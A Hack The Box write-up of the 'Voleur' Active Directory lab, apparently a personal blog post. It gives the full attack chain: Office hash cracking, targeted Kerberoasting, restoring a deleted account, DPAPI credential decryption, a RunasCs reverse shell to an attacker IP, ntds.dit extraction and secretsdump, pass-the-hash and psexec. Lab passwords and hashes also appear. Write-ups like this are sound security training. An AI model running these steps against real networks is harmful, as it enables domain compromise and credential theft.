---

title: "HTB Voleur"
date: 2026-01-07 11:00:00 +1100
categories: [Hack The Box]
tags: [
Active Directory,
Kerberos,
SMB,
BloodHound,
Kerberoasting,
DPAPI,
NTDS.dit,
secretsdump,
WSL,
Evil-WinRM
]
image:
  path: /assets/img/Voleur/icon.png

---

Today, we will be doing Voleur, which is a medium difficulty Windows box from Hack The Box. The box gives us the following credentials to start out with:

```text
ryan.naylor / HollowOct31Nyt
```

## Nmap

Starting things off, we will run an Nmap scan.

From the open ports (LDAP, Kerberos, DNS, etc.), we can tell this host is a Domain Controller.

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 08:42 AEST
Nmap scan report for 10.10.11.76
Host is up (0.33s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-06 06:44:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 8h00m45s
| smb2-time: 
|   date: 2025-09-06T06:44:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.00 seconds
```

## Initial Enumeration

Kicking things off, if we try to authenticate over NTLM we can see it's disabled:

```shell
netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         10.10.11.76     445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

So instead, we authenticate using Kerberos:

```shell
netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

As you can see, it works.

## Spidering shares

If we enumerate shares, we can see Finance and HR exist but we don’t have access yet. We do, however, have read access to the IT share:

```shell
netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt --shares -k 
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.10.11.76     445    DC               [*] Enumerated shares
SMB         10.10.11.76     445    DC               Share           Permissions     Remark
SMB         10.10.11.76     445    DC               -----           -----------     ------
SMB         10.10.11.76     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.76     445    DC               C$                              Default share
SMB         10.10.11.76     445    DC               Finance                         
SMB         10.10.11.76     445    DC               HR                              
SMB         10.10.11.76     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.76     445    DC               IT              READ            
SMB         10.10.11.76     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.76     445    DC               SYSVOL          READ            Logon server share 
```

Let’s take a look in the IT share:

```shell
crackmapexec smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -d voleur.htb --spider IT --regex . -k
SMB         dc.voleur.htb   445    dc.voleur.htb    [*]  x64 (name:dc.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc.voleur.htb    [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc.voleur.htb    [*] Started spidering
SMB         dc.voleur.htb   445    dc.voleur.htb    [*] Spidering .
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/. [dir]
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/.. [dir]
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/First-Line Support [dir]
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/First-Line Support/. [dir]
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/First-Line Support/.. [dir]
SMB         dc.voleur.htb   445    dc.voleur.htb    //dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-30 08:23' size:16896]
```

We see a document, so let’s download it:

```shell
crackmapexec smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -d voleur.htb -k --share IT --get-file "First-Line Support/Access_Review.xlsx" Access_Review.xlsx
SMB         dc.voleur.htb   445    dc.voleur.htb    [*]  x64 (name:dc.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc.voleur.htb    [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc.voleur.htb    [*] Copy First-Line Support/Access_Review.xlsx to Access_Review.xlsx
SMB         dc.voleur.htb   445    dc.voleur.htb    [+] File First-Line Support/Access_Review.xlsx was transferred to Access_Review.xlsx
```

## **Cracking document**

Trying to open the document, we can see it is password-protected:

![image.png](/assets/img/Voleur/1.png)

We can use office2john to extract a hash and crack it with John:

```shell
──(kali㉿kali)-[~/boxes/voleur]
└─$ office2john Access_Review.xlsx > hash.txt
                                                                                                                  
┌──(kali㉿kali)-[~/boxes/voleur]
└─$ cat hash.txt  
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
                                                                                                                  
┌──(kali㉿kali)-[~/boxes/voleur]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:03 DONE (2025-09-06 17:40) 0.3105g/s 243.4p/s 243.4c/s 243.4C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

In the document we find some very useful information:

![image.png](/assets/img/Voleur/2.png)

We find a deleted account (Todd), along with credentials for `svc_iis` and `svc_ldap`.

## Bloodhound

Let’s run BloodHound to get a lay of the land. Since NTLM is disabled, we will use Kerberos.

First, we add the domain to our Kerberos configuration (`/etc/krb5.conf`):

```ini
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VOLEUR.HTB = {
        kdc = 10.10.11.76
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

Then we request a TGT for `ryan.naylor`, which allows us to authenticate to domain services using the ticket cache:

```shell
┌──(kali㉿kali)-[~]
└─$ kinit ryan.naylor@VOLEUR.HTB

Password for ryan.naylor@VOLEUR.HTB: 
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ klist                       
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
09/06/2025 17:10:09  09/07/2025 03:10:09  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/07/2025 17:09:59
                                                                                                                  
┌──(kali㉿kali)-[~]
```

Now we run BloodHound collection:

```shell
bloodhound-python -d voleur.htb  -u ryan.naylor -k  -ns 10.10.11.76 -c All
 INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 01M 06S
```

From BloodHound, we can see that `svc_ldap` is part of the **Restore Users** group. That group has **GenericWrite** over `lacey.miller`, and `svc_ldap` can also write an SPN to `svc_winrm`:

![image.png](/assets/img/Voleur/3.png)

![image.png](/assets/img/Voleur/4.png)

Let’s test the `svc_ldap` credentials:

```shell
netexec smb dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn  -d voleur.htb -k 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5
```

Let’s request a TGT for `svc_ldap`:

```shell
─$ kinit svc_ldap@VOLEUR.HTB

Password for svc_ldap@VOLEUR.HTB: 
                                                                                                                  
┌──(kali㉿kali)-[~/ADPenetrationTester/Kerberos/krbrelayx]
└─$ klist                    
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
09/06/2025 18:16:04  09/07/2025 04:16:04  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/07/2025 18:15:57
                                                                                                                  
┌──(kali㉿kali)-[~/ADPenetrationTester/Kerberos/krbrelayx]
└─$ 
```

Now we perform a targeted Kerberoast:

```shell
python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb -o hashes.txt 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (lacey.miller)
[+] Writing hash to file for (svc_winrm)
```

We only crack one hash, which belongs to `svc_winrm`:

```shell
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi
```

Now we can request a TGT for `svc_winrm` and connect via Evil-WinRM:

```shell
┌──(kali㉿kali)-[~/boxes/voleur]
└─$ impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'                               

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
  

export KRB5CCNAME=svc_winrm.ccache
                                       
                                                                                                                  
┌──(kali㉿kali)-[~/boxes/voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb -u svc_winrm -k svc_winrm.ccache
```

## Restoring user

We know that `svc_ldap` is a member of **Restore Users**, and we want to restore the deleted `todd.wolfe` account.

We upload RunasCs to get a shell as `svc_ldap`:

```powershell
upload ../../../../../home/kali/Downloads/RunasCs.exe
.\RunasCs.exe voleur.htb\svc_ldap M1XyC9pW7qT5Vn powershell.exe

.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.49:4444
```

Now we have a shell as `svc_ldap`:

```shell
└─$ nc -lvnp 4444                                                                      
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.76] 58439
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
PS C:\Windows\system32> 
```

We can list deleted objects:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * | select samaccountname,useraccountcontrol
 
samaccountname useraccountcontrol
-------------- ------------------
                                 
todd.wolfe     66048
```

And restore Todd using his Deleted Objects DN:

```powershell
Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
```

If we run `net user`, we can see Todd is now restored:

```powershell
PS C:\Windows\system32> net user     
net user 

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.

PS C:\Windows\system32> 
```

Now we can authenticate as Todd:

```shell
netexec smb dc.voleur.htb -u Todd.Wolfe -p NightT1meP1dg3on14  -d voleur.htb -k 

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\Todd.Wolfe:NightT1meP1dg3on14
```

Let’s request a TGT and connect over WinRM:

```shell
impacket-getTGT voleur.htb/Todd.Wolfe:'NightT1meP1dg3on14'
export KRB5CCNAME=Todd.Wolfe.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb -u Todd.Wolfe -k Todd.Wolfe.ccache
```

## Looking thorugh shares

Now we can have another look through the IT share:

```shell
impacket-smbclient -k dc.voleur.htb 
```

We find a backup of Todd’s profile under Archived Users:

```shell
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
drw-rw-rw-          0  Sat Sep  6 08:57:22 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 .
drw-rw-rw-          0  Thu Jan 30 02:13:03 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Thu Jan 30 02:13:16 2025 .
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 ..
drw-rw-rw-          0  Thu Jan 30 02:13:06 2025 3D Objects
drw-rw-rw-          0  Thu Jan 30 02:13:09 2025 AppData
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Contacts
drw-rw-rw-          0  Fri Jan 31 01:28:50 2025 Desktop
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Documents
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Downloads
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Favorites
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Links
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Music
-rw-rw-rw-      65536  Thu Jan 30 02:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 23:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 23:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 23:53:07 2025 ntuser.ini
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Pictures
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Saved Games
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Searches
drw-rw-rw-          0  Thu Jan 30 02:13:10 2025 Videos
```

## DPAPI

If we take a look at Todd’s stored credentials, we find a DPAPI credential blob:

```shell
# get 772275FAD58525253490A9B0039791D3
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
```

We also need Todd’s DPAPI master key:

```shell
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# 
```

Now we decrypt the master key using Todd’s password:

```shell
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -password 'NightT1meP1dg3on14'
  
Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

With the master key decrypted, we can decrypt the credential blob:

```shell
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

```shell
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Let’s rerun BloodHound as `jeremy.combs`:

```shell
bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns 10.10.11.76 -c All -d voleur.htb --zip
```

We can see he is part of **Third-Line Technicians**:

![image.png](/assets/img/Voleur/5.png)

Now we can access the Third-Line Support folder and pull down an SSH key:

```shell
$ impacket-smbclient -k dc.voleur.htb 

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 .
drw-rw-rw-          0  Sat Sep  6 08:57:22 2025 ..
drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Fri Jan 31 03:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 20:10:01 2025 ..
-rw-rw-rw-       2602  Fri Jan 31 03:11:29 2025 id_rsa
-rw-rw-rw-        186  Fri Jan 31 03:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
```

The note says:

```text
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,
```

Now we try to log in as `svc_backup` using the SSH key:

```shell
ssh svc_backup@voleur.htb -i id_rsa -p 2222
```

Now we are in a WSL shell. If we check `/mnt`, we can see the Windows `C:` drive mounted. From there, we can access the IT share and navigate into Third-Line Support, where backups of `ntds.dit` and registry hives are stored:

```shell
svc_backup@DC:~$ cd /mnt
svc_backup@DC:/mnt$ ls
c
svc_backup@DC:/mnt$ cd c
svc_backup@DC:/mnt/c$ ls
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             DumpStack.log.tmp   PerfLogs               Recovery                     inetpub
'$WinREAgent'              Finance            'Program Files'        'System Volume Information'   pagefile.sys
 Config.Msi                HR                 'Program Files (x86)'   Users                        temp
'Documents and Settings'   IT                  ProgramData            Windows
svc_backup@DC:/mnt/c$ cat Config.Msi
cat: Config.Msi: Permission denied
svc_backup@DC:/mnt/c$ cat DumpStack.log.tmp
cat: DumpStack.log.tmp: Permission denied
svc_backup@DC:/mnt/c$ cd IT
svc_backup@DC:/mnt/c/IT$ ls
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
svc_backup@DC:/mnt/c/IT$ cd 'Third-Line Support'/
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ;s
-bash: syntax error near unexpected token `;'
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ 
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ 
```

Let’s transfer the files over:

```shell
scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
```

Now we can dump secrets:

```shell
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM 
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
...
[*] Cleaning up... 
```

Now we can request a TGT for the Administrator using the NT hash:

```shell
impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
export KRB5CCNAME=Administrator.ccache 
```

And we can `psexec` into the machine:

```shell
psexec.py -k -no-pass dc.voleur.htb           
Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.voleur.htb.....
[*] Found writable share ADMIN$
[*] Uploading file bthgQcHN.exe
[*] Opening SVCManager on dc.voleur.htb.....
[*] Creating service WRat on dc.voleur.htb.....
[*] Starting service WRat.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\Users\Administrator\Desktop\root.txt
6c130d9e7e5dbb02da8f15a8386db620

C:\Windows\system32> 
```
